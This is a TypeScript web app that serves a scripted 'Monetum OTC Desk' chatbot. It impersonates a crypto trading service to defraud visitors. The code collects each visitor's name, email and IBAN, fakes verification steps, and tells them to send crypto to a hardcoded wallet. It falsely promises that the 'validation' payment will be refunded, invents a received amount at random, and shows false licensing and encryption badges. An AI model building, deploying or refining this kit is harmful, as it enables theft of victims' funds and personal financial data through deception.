import { Hono } from 'hono'
import { cors } from 'hono/cors'
import { serveStatic } from 'hono/cloudflare-pages'

type Bindings = {
  OPENAI_API_KEY: string
}

const app = new Hono<{ Bindings: Bindings }>()

// CORS for API routes
app.use('/api/*', cors())

// Serve static files
app.use('/static/*', serveStatic())

// OTC Process State Machine
const OTC_STEPS = {
  WELCOME: 'welcome',
  ASK_NAME: 'ask_name',
  ASK_EMAIL: 'ask_email',
  ASK_IBAN: 'ask_iban',
  VERIFY_INFO: 'verify_info',
  ASK_CRYPTO: 'ask_crypto',
  ASK_NETWORK: 'ask_network',
  OWNERSHIP_VALIDATION: 'ownership_validation',
  WAIT_OWNERSHIP_TX: 'wait_ownership_tx',
  OWNERSHIP_CONFIRMED: 'ownership_confirmed',
  WAIT_FULL_PAYMENT: 'wait_full_payment',
  PAYMENT_RECEIVED: 'payment_received',
  CONFIRM_CONVERSION: 'confirm_conversion',
  COMPLETED: 'completed',
  CLOSED: 'closed'
}

// API endpoint for chat
app.post('/api/chat', async (c) => {
  const body = await c.req.json()
  const { message, state, userData } = body

  // Process the conversation based on current state
  const response = processOTCConversation(message, state, userData)
  
  return c.json(response)
})

function processOTCConversation(message: string, currentState: string, userData: any) {
  const normalizedMessage = message.toLowerCase().trim()
  
  switch (currentState) {
    case OTC_STEPS.WELCOME:
      return {
        agentMessage: `Hello and welcome to Monetum OTC Desk! 👋

Thank you for choosing our secure OTC trading service. My name is Alex, and I'll be assisting you today with your transaction.

This process will only take a few minutes, and rest assured that all your information is handled with the highest level of security and confidentiality.

Let's get started! Could you please confirm your **full name** as registered on your Monetum account?`,
        nextState: OTC_STEPS.ASK_NAME,
        inputType: 'text',
        inputLabel: 'Full Name',
        inputPlaceholder: 'Enter your full name...',
        inputField: 'fullName'
      }

    case OTC_STEPS.ASK_NAME:
      return {
        agentMessage: `Thank you, **${userData.fullName}**. Your name has been verified. ✓

Now, please provide the **email address** associated with your Monetum account.`,
        nextState: OTC_STEPS.ASK_EMAIL,
        inputType: 'email',
        inputLabel: 'Email Address',
        inputPlaceholder: 'Enter your email...',
        inputField: 'email'
      }

    case OTC_STEPS.ASK_EMAIL:
      return {
        agentMessage: `Perfect! Email confirmed: **${userData.email}** ✓

For the final verification step, please provide the **IBAN** where you would like to receive the funds.`,
        nextState: OTC_STEPS.ASK_IBAN,
        inputType: 'text',
        inputLabel: 'IBAN',
        inputPlaceholder: 'Enter your IBAN...',
        inputField: 'iban'
      }

    case OTC_STEPS.ASK_IBAN:
      return {
        agentMessage: `Excellent! Let me verify your information...

🔄 *Verifying account details...*`,
        nextState: OTC_STEPS.VERIFY_INFO,
        showLoader: true,
        loaderDuration: 2000
      }

    case OTC_STEPS.VERIFY_INFO:
      return {
        agentMessage: `✅ All information has been verified successfully!

**Account Summary:**
- Name: ${userData.fullName}
- Email: ${userData.email}
- IBAN: ${userData.iban}

Now, let's proceed with your trade. Which **cryptocurrency** would you like to sell?`,
        nextState: OTC_STEPS.ASK_CRYPTO,
        inputType: 'select',
        inputLabel: 'Cryptocurrency',
        inputOptions: ['USDC', 'USDT', 'ETH', 'BTC', 'DAI'],
        inputField: 'crypto'
      }

    case OTC_STEPS.ASK_CRYPTO:
      return {
        agentMessage: `Great choice! You've selected **${userData.crypto}**. ✓

Which **blockchain network** will you be using for this transaction?`,
        nextState: OTC_STEPS.ASK_NETWORK,
        inputType: 'select',
        inputLabel: 'Network',
        inputOptions: userData.crypto === 'BTC' ? ['Bitcoin'] : ['Ethereum', 'Polygon', 'Arbitrum', 'Optimism', 'Base'],
        inputField: 'network'
      }

    case OTC_STEPS.ASK_NETWORK:
      const validationAmount = '2.64'
      const validationCrypto = userData.crypto === 'USDC' || userData.crypto === 'USDT' || userData.crypto === 'DAI' ? userData.crypto : 'USDC'
      return {
        agentMessage: `Perfect! Network selected: **${userData.network}** ✓

🔐 **Wallet Ownership Validation Required**

For security purposes, we need to verify that you own the wallet you'll be sending from. This is a standard compliance procedure.

Please send exactly **${validationAmount} ${validationCrypto}** to the following address:

\`0x7F5EB5bB5cF88cfcEe9613368636f458800e62CB\`

**Network:** Ethereum (regardless of your chosen network for the main transaction)

Once sent, you can either:
- Enter the **Transaction ID** below
- Or wait a few minutes for automatic confirmation

This small amount will be credited back to your account.`,
        nextState: OTC_STEPS.WAIT_OWNERSHIP_TX,
        inputType: 'text',
        inputLabel: 'Transaction ID (optional)',
        inputPlaceholder: 'Enter TX hash or click "Validate" to auto-check...',
        inputField: 'ownershipTxId',
        showValidateButton: true,
        validationAmount,
        validationCrypto
      }

    case OTC_STEPS.WAIT_OWNERSHIP_TX:
      return {
        agentMessage: `🔄 *Checking blockchain for your transaction...*`,
        nextState: OTC_STEPS.OWNERSHIP_CONFIRMED,
        showLoader: true,
        loaderDuration: 3000
      }

    case OTC_STEPS.OWNERSHIP_CONFIRMED:
      return {
        agentMessage: `✅ **Wallet ownership confirmed!** Thank you for completing the verification.

You are now ready to proceed with your full payment.

Please send your **${userData.crypto}** to the same address:

\`0x7F5EB5bB5cF88cfcEe9613368636f458800e62CB\`

**Network:** ${userData.network}

Once sent, enter the **Transaction ID** below or wait for automatic detection.`,
        nextState: OTC_STEPS.WAIT_FULL_PAYMENT,
        inputType: 'text',
        inputLabel: 'Transaction ID',
        inputPlaceholder: 'Enter TX hash...',
        inputField: 'paymentTxId',
        showValidateButton: true
      }

    case OTC_STEPS.WAIT_FULL_PAYMENT:
      return {
        agentMessage: `🔄 *Confirming transaction on ${userData.network}...*`,
        nextState: OTC_STEPS.PAYMENT_RECEIVED,
        showLoader: true,
        loaderDuration: 4000
      }

    case OTC_STEPS.PAYMENT_RECEIVED:
      // Simulate received amount (slightly different from expected to show realism)
      const receivedAmount = (Math.random() * 9000 + 1000).toFixed(2)
      const rate = 0.92 // EUR/USD rate simulation
      const feePercent = 0.5
      const amountBeforeFees = parseFloat(receivedAmount) * rate
      const fees = amountBeforeFees * (feePercent / 100)
      const finalAmount = (amountBeforeFees - fees).toFixed(2)
      
      return {
        agentMessage: `✅ **Funds received successfully!**

📊 **Transaction Summary:**

| Description | Amount |
|-------------|--------|
| ${userData.crypto} Received | ${receivedAmount} ${userData.crypto} |
| Exchange Rate | 1 ${userData.crypto} = €${rate.toFixed(4)} |
| Gross Amount | €${amountBeforeFees.toFixed(2)} |
| Service Fee (0.5%) | -€${fees.toFixed(2)} |
| **Net Amount** | **€${finalAmount}** |

Please review and confirm this transaction:`,
        nextState: OTC_STEPS.CONFIRM_CONVERSION,
        showConfirmButtons: true,
        transactionData: {
          receivedAmount,
          crypto: userData.crypto,
          rate,
          feePercent,
          fees: fees.toFixed(2),
          grossAmount: amountBeforeFees.toFixed(2),
          netAmount: finalAmount
        }
      }

    case OTC_STEPS.CONFIRM_CONVERSION:
      if (normalizedMessage === 'confirm') {
        return {
          agentMessage: `🔄 *Processing your conversion...*`,
          nextState: OTC_STEPS.COMPLETED,
          showLoader: true,
          loaderDuration: 3000
        }
      } else if (normalizedMessage === 'cancel') {
        return {
          agentMessage: `❌ **Transaction Cancelled**

As per our policy, your funds will be returned minus a 1% cancellation fee.

The refund will be processed within 24-48 hours to your original wallet address.

Is there anything else I can help you with today?`,
          nextState: OTC_STEPS.CLOSED,
          showNewDealButton: true
        }
      }
      break

    case OTC_STEPS.COMPLETED:
      return {
        agentMessage: `✅ **Transaction Complete!**

Your conversion has been successfully processed. The amount of **€${userData.transactionData?.netAmount || '0.00'}** will be credited to your Monetum account within the next few minutes.

📧 A confirmation email has been sent to ${userData.email}.

Thank you for using Monetum OTC Desk! 🙏

Would you like to initiate another trade, or shall we close this session?`,
        nextState: OTC_STEPS.CLOSED,
        showNewDealButton: true,
        showCloseButton: true
      }

    case OTC_STEPS.CLOSED:
      if (normalizedMessage === 'new') {
        return {
          agentMessage: `Perfect! Let's start a new OTC deal.

Could you please confirm your **full name** as registered on your Monetum account?`,
          nextState: OTC_STEPS.ASK_NAME,
          inputType: 'text',
          inputLabel: 'Full Name',
          inputPlaceholder: 'Enter your full name...',
          inputField: 'fullName',
          resetUserData: true
        }
      }
      return {
        agentMessage: `Thank you for using Monetum OTC Desk! Have a great day! 👋

*Session closed.*`,
        nextState: OTC_STEPS.CLOSED,
        sessionEnded: true
      }

    default:
      return {
        agentMessage: `I apologize, but I didn't understand that. Could you please try again?`,
        nextState: currentState
      }
  }
}

// Main page
app.get('/', (c) => {
  return c.html(`<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Monetum OTC Desk</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.0/css/all.min.css" rel="stylesheet">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        monetum: {
                            dark: '#0a0f1e',
                            darker: '#060b16',
                            primary: '#6366f1',
                            secondary: '#8b5cf6',
                            accent: '#22d3ee',
                            success: '#10b981',
                            warning: '#f59e0b',
                            error: '#ef4444',
                            text: '#e2e8f0',
                            muted: '#94a3b8'
                        }
                    },
                    fontFamily: {
                        inter: ['Inter', 'sans-serif']
                    }
                }
            }
        }
    </script>
    <style>
        body {
            font-family: 'Inter', sans-serif;
            background: linear-gradient(135deg, #0a0f1e 0%, #1a1f3e 50%, #0a0f1e 100%);
        }
        .glass-effect {
            background: rgba(15, 23, 42, 0.8);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(99, 102, 241, 0.2);
        }
        .secure-badge {
            background: linear-gradient(135deg, rgba(16, 185, 129, 0.1), rgba(34, 211, 238, 0.1));
            border: 1px solid rgba(16, 185, 129, 0.3);
        }
        .chat-message {
            animation: fadeIn 0.3s ease-out;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .typing-indicator span {
            animation: bounce 1.4s infinite ease-in-out both;
        }
        .typing-indicator span:nth-child(1) { animation-delay: -0.32s; }
        .typing-indicator span:nth-child(2) { animation-delay: -0.16s; }
        @keyframes bounce {
            0%, 80%, 100% { transform: scale(0); }
            40% { transform: scale(1); }
        }
        .input-secure {
            background: linear-gradient(135deg, rgba(15, 23, 42, 0.9), rgba(30, 41, 59, 0.9));
            border: 1px solid rgba(99, 102, 241, 0.3);
        }
        .input-secure:focus {
            border-color: rgba(99, 102, 241, 0.6);
            box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.1);
        }
        .btn-primary {
            background: linear-gradient(135deg, #6366f1, #8b5cf6);
            transition: all 0.3s ease;
        }
        .btn-primary:hover {
            transform: translateY(-1px);
            box-shadow: 0 4px 20px rgba(99, 102, 241, 0.4);
        }
        .btn-success {
            background: linear-gradient(135deg, #10b981, #059669);
        }
        .btn-danger {
            background: linear-gradient(135deg, #ef4444, #dc2626);
        }
        .pulse-glow {
            animation: pulseGlow 2s ease-in-out infinite;
        }
        @keyframes pulseGlow {
            0%, 100% { box-shadow: 0 0 5px rgba(99, 102, 241, 0.5); }
            50% { box-shadow: 0 0 20px rgba(99, 102, 241, 0.8); }
        }
        .markdown-table {
            width: 100%;
            border-collapse: collapse;
            margin: 10px 0;
        }
        .markdown-table th, .markdown-table td {
            padding: 8px 12px;
            border: 1px solid rgba(99, 102, 241, 0.2);
            text-align: left;
        }
        .markdown-table th {
            background: rgba(99, 102, 241, 0.1);
        }
        code {
            background: rgba(99, 102, 241, 0.2);
            padding: 2px 8px;
            border-radius: 4px;
            font-family: monospace;
            word-break: break-all;
        }
    </style>
</head>
<body class="min-h-screen flex items-center justify-center p-4">
    <!-- Background Effects -->
    <div class="fixed inset-0 overflow-hidden pointer-events-none">
        <div class="absolute top-1/4 left-1/4 w-96 h-96 bg-monetum-primary/10 rounded-full blur-3xl"></div>
        <div class="absolute bottom-1/4 right-1/4 w-96 h-96 bg-monetum-secondary/10 rounded-full blur-3xl"></div>
    </div>

    <!-- Main Widget -->
    <div class="relative w-full max-w-lg">
        <!-- Widget Container -->
        <div class="glass-effect rounded-2xl shadow-2xl overflow-hidden">
            <!-- Header -->
            <div class="bg-gradient-to-r from-monetum-primary/20 to-monetum-secondary/20 p-4 border-b border-monetum-primary/20">
                <div class="flex items-center justify-between">
                    <div class="flex items-center gap-3">
                        <!-- Monetum Logo -->
                        <div class="w-10 h-10 rounded-xl bg-gradient-to-br from-monetum-primary to-monetum-secondary flex items-center justify-center">
                            <svg viewBox="0 0 40 40" class="w-6 h-6 text-white">
                                <path fill="currentColor" d="M20 4L4 12v16l16 8 16-8V12L20 4zm0 4l12 6-12 6-12-6 12-6zm-12 10l12 6 12-6v8l-12 6-12-6v-8z"/>
                            </svg>
                        </div>
                        <div>
                            <h1 class="text-lg font-semibold text-white">Initiate OTC Deal</h1>
                            <p class="text-xs text-monetum-muted">Monetum Secure Trading</p>
                        </div>
                    </div>
                    <!-- Security Badges -->
                    <div class="flex items-center gap-2">
                        <div class="secure-badge px-2 py-1 rounded-full flex items-center gap-1">
                            <i class="fas fa-shield-halved text-monetum-success text-xs"></i>
                            <span class="text-xs text-monetum-success font-medium">Secured</span>
                        </div>
                        <div class="secure-badge px-2 py-1 rounded-full flex items-center gap-1">
                            <i class="fas fa-lock text-monetum-accent text-xs"></i>
                            <span class="text-xs text-monetum-accent font-medium">256-bit</span>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Chat Container -->
            <div id="chatContainer" class="h-96 overflow-y-auto p-4 space-y-4 scroll-smooth">
                <!-- Welcome message will be inserted here -->
            </div>

            <!-- Input Area -->
            <div id="inputArea" class="p-4 border-t border-monetum-primary/20">
                <!-- Dynamic input will be inserted here -->
                <div id="startButton" class="text-center">
                    <button onclick="startChat()" class="btn-primary px-8 py-3 rounded-xl text-white font-medium pulse-glow">
                        <i class="fas fa-comments mr-2"></i>
                        Start OTC Deal
                    </button>
                </div>
            </div>

            <!-- Footer -->
            <div class="bg-monetum-darker/50 px-4 py-2 flex items-center justify-between text-xs text-monetum-muted">
                <div class="flex items-center gap-2">
                    <i class="fas fa-fingerprint text-monetum-primary"></i>
                    <span>End-to-end encrypted</span>
                </div>
                <div class="flex items-center gap-2">
                    <span>Powered by</span>
                    <span class="text-monetum-primary font-semibold">Monetum</span>
                </div>
            </div>
        </div>

        <!-- Trust Indicators -->
        <div class="mt-4 flex justify-center gap-6 text-monetum-muted text-xs">
            <div class="flex items-center gap-1">
                <i class="fas fa-certificate text-monetum-success"></i>
                <span>EU Licensed</span>
            </div>
            <div class="flex items-center gap-1">
                <i class="fas fa-user-shield text-monetum-accent"></i>
                <span>KYC Compliant</span>
            </div>
            <div class="flex items-center gap-1">
                <i class="fas fa-building-columns text-monetum-primary"></i>
                <span>Regulated</span>
            </div>
        </div>
    </div>

    <script>
        // State management
        let currentState = 'welcome';
        let userData = {};
        let chatHistory = [];

        const chatContainer = document.getElementById('chatContainer');
        const inputArea = document.getElementById('inputArea');

        function formatMessage(text) {
            // Convert markdown-style formatting
            let formatted = text
                .replace(/\\*\\*(.+?)\\*\\*/g, '<strong>$1</strong>')
                .replace(/\\*(.+?)\\*/g, '<em>$1</em>')
                .replace(/\\\`([^\\\`]+)\\\`/g, '<code>$1</code>')
                .replace(/\\n/g, '<br>');
            
            // Convert markdown tables
            if (formatted.includes('|')) {
                const lines = formatted.split('<br>');
                let tableLines = [];
                let inTable = false;
                let result = [];
                
                lines.forEach(line => {
                    if (line.includes('|') && line.trim().startsWith('|')) {
                        if (!inTable) {
                            inTable = true;
                            tableLines = [];
                        }
                        tableLines.push(line);
                    } else {
                        if (inTable) {
                            result.push(convertTable(tableLines));
                            inTable = false;
                            tableLines = [];
                        }
                        result.push(line);
                    }
                });
                
                if (inTable) {
                    result.push(convertTable(tableLines));
                }
                
                formatted = result.join('<br>');
            }
            
            return formatted;
        }

        function convertTable(lines) {
            if (lines.length < 2) return lines.join('<br>');
            
            let html = '<table class="markdown-table">';
            lines.forEach((line, idx) => {
                if (line.includes('---')) return; // Skip separator row
                const cells = line.split('|').filter(c => c.trim());
                const tag = idx === 0 ? 'th' : 'td';
                html += '<tr>' + cells.map(c => \`<\${tag}>\${c.trim()}</\${tag}>\`).join('') + '</tr>';
            });
            html += '</table>';
            return html;
        }

        function addMessage(content, isAgent = true) {
            const messageDiv = document.createElement('div');
            messageDiv.className = \`chat-message flex \${isAgent ? 'justify-start' : 'justify-end'}\`;
            
            const bubble = document.createElement('div');
            bubble.className = \`max-w-[85%] p-3 rounded-2xl \${
                isAgent 
                    ? 'bg-monetum-dark/80 text-monetum-text rounded-tl-none' 
                    : 'bg-gradient-to-r from-monetum-primary to-monetum-secondary text-white rounded-tr-none'
            }\`;
            
            if (isAgent) {
                const header = document.createElement('div');
                header.className = 'flex items-center gap-2 mb-2';
                header.innerHTML = \`
                    <div class="w-6 h-6 rounded-full bg-gradient-to-br from-monetum-primary to-monetum-secondary flex items-center justify-center">
                        <i class="fas fa-robot text-white text-xs"></i>
                    </div>
                    <span class="text-xs font-medium text-monetum-primary">OTC Agent</span>
                \`;
                bubble.appendChild(header);
            }
            
            const text = document.createElement('div');
            text.className = 'text-sm leading-relaxed';
            text.innerHTML = formatMessage(content);
            bubble.appendChild(text);
            
            messageDiv.appendChild(bubble);
            chatContainer.appendChild(messageDiv);
            chatContainer.scrollTop = chatContainer.scrollHeight;
        }

        function addTypingIndicator() {
            const typingDiv = document.createElement('div');
            typingDiv.id = 'typingIndicator';
            typingDiv.className = 'chat-message flex justify-start';
            typingDiv.innerHTML = \`
                <div class="bg-monetum-dark/80 p-3 rounded-2xl rounded-tl-none">
                    <div class="typing-indicator flex gap-1">
                        <span class="w-2 h-2 bg-monetum-primary rounded-full"></span>
                        <span class="w-2 h-2 bg-monetum-primary rounded-full"></span>
                        <span class="w-2 h-2 bg-monetum-primary rounded-full"></span>
                    </div>
                </div>
            \`;
            chatContainer.appendChild(typingDiv);
            chatContainer.scrollTop = chatContainer.scrollHeight;
        }

        function removeTypingIndicator() {
            const typing = document.getElementById('typingIndicator');
            if (typing) typing.remove();
        }

        function renderInput(response) {
            inputArea.innerHTML = '';
            
            if (response.sessionEnded) {
                inputArea.innerHTML = \`
                    <div class="text-center text-monetum-muted text-sm">
                        <i class="fas fa-check-circle text-monetum-success mr-2"></i>
                        Session completed
                    </div>
                \`;
                return;
            }
            
            if (response.showNewDealButton || response.showCloseButton) {
                inputArea.innerHTML = \`
                    <div class="flex gap-3 justify-center">
                        \${response.showNewDealButton ? \`
                            <button onclick="sendMessage('new')" class="btn-primary px-6 py-2 rounded-xl text-white font-medium text-sm">
                                <i class="fas fa-plus mr-2"></i>New Deal
                            </button>
                        \` : ''}
                        \${response.showCloseButton ? \`
                            <button onclick="sendMessage('close')" class="bg-monetum-dark border border-monetum-primary/30 px-6 py-2 rounded-xl text-monetum-text font-medium text-sm hover:bg-monetum-dark/80">
                                <i class="fas fa-times mr-2"></i>Close
                            </button>
                        \` : ''}
                    </div>
                \`;
                return;
            }
            
            if (response.showConfirmButtons) {
                inputArea.innerHTML = \`
                    <div class="flex gap-3 justify-center">
                        <button onclick="sendMessage('confirm')" class="btn-success px-8 py-3 rounded-xl text-white font-medium">
                            <i class="fas fa-check mr-2"></i>Confirm
                        </button>
                        <button onclick="sendMessage('cancel')" class="btn-danger px-8 py-3 rounded-xl text-white font-medium">
                            <i class="fas fa-times mr-2"></i>Cancel
                        </button>
                    </div>
                \`;
                return;
            }
            
            if (response.inputType) {
                let inputHtml = '';
                
                if (response.inputType === 'select') {
                    inputHtml = \`
                        <select id="userInput" class="input-secure w-full px-4 py-3 rounded-xl text-monetum-text focus:outline-none">
                            <option value="">Select \${response.inputLabel}...</option>
                            \${response.inputOptions.map(opt => \`<option value="\${opt}">\${opt}</option>\`).join('')}
                        </select>
                    \`;
                } else {
                    inputHtml = \`
                        <input type="\${response.inputType}" 
                               id="userInput" 
                               placeholder="\${response.inputPlaceholder}"
                               class="input-secure w-full px-4 py-3 rounded-xl text-monetum-text focus:outline-none"
                               onkeypress="if(event.key === 'Enter') submitInput()">
                    \`;
                }
                
                inputArea.innerHTML = \`
                    <div class="space-y-3">
                        <div class="flex items-center gap-2 text-xs text-monetum-muted">
                            <i class="fas fa-shield-halved text-monetum-success"></i>
                            <span>Secure input · \${response.inputLabel}</span>
                        </div>
                        <div class="flex gap-2">
                            \${inputHtml}
                            <button onclick="submitInput()" class="btn-primary px-4 py-3 rounded-xl text-white">
                                <i class="fas fa-paper-plane"></i>
                            </button>
                            \${response.showValidateButton ? \`
                                <button onclick="autoValidate()" class="bg-monetum-dark border border-monetum-accent/30 px-4 py-3 rounded-xl text-monetum-accent hover:bg-monetum-accent/10">
                                    <i class="fas fa-sync"></i>
                                </button>
                            \` : ''}
                        </div>
                    </div>
                \`;
                
                // Store current input field for later
                window.currentInputField = response.inputField;
                
                setTimeout(() => {
                    const input = document.getElementById('userInput');
                    if (input) input.focus();
                }, 100);
            }
        }

        async function sendMessage(message) {
            if (!message || message.trim() === '') return;
            
            // Add user message to chat
            addMessage(message, false);
            
            // Show typing indicator
            addTypingIndicator();
            
            try {
                const response = await fetch('/api/chat', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        message,
                        state: currentState,
                        userData
                    })
                });
                
                const data = await response.json();
                
                // Handle loader state
                if (data.showLoader) {
                    await new Promise(resolve => setTimeout(resolve, data.loaderDuration));
                    
                    // Get next response after loader
                    const nextResponse = await fetch('/api/chat', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            message: '',
                            state: data.nextState,
                            userData
                        })
                    });
                    
                    const nextData = await nextResponse.json();
                    removeTypingIndicator();
                    
                    // Store transaction data if present
                    if (nextData.transactionData) {
                        userData.transactionData = nextData.transactionData;
                    }
                    
                    addMessage(nextData.agentMessage);
                    currentState = nextData.nextState;
                    renderInput(nextData);
                } else {
                    removeTypingIndicator();
                    
                    // Reset user data if requested
                    if (data.resetUserData) {
                        userData = {};
                    }
                    
                    // Store transaction data if present
                    if (data.transactionData) {
                        userData.transactionData = data.transactionData;
                    }
                    
                    addMessage(data.agentMessage);
                    currentState = data.nextState;
                    renderInput(data);
                }
                
            } catch (error) {
                removeTypingIndicator();
                addMessage('Sorry, there was an error processing your request. Please try again.');
            }
        }

        function submitInput() {
            const input = document.getElementById('userInput');
            if (!input) return;
            
            const value = input.value.trim();
            if (!value) return;
            
            // Store the value in userData
            if (window.currentInputField) {
                userData[window.currentInputField] = value;
            }
            
            sendMessage(value);
        }

        function autoValidate() {
            // Simulate auto-validation
            userData[window.currentInputField] = 'auto-validated';
            sendMessage('Validating...');
        }

        async function startChat() {
            document.getElementById('startButton').style.display = 'none';
            
            addTypingIndicator();
            
            // Small delay for UX
            await new Promise(resolve => setTimeout(resolve, 800));
            
            const response = await fetch('/api/chat', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    message: 'start',
                    state: 'welcome',
                    userData: {}
                })
            });
            
            const data = await response.json();
            removeTypingIndicator();
            
            addMessage(data.agentMessage);
            currentState = data.nextState;
            renderInput(data);
        }
    </script>
</body>
</html>`)
})

export default app
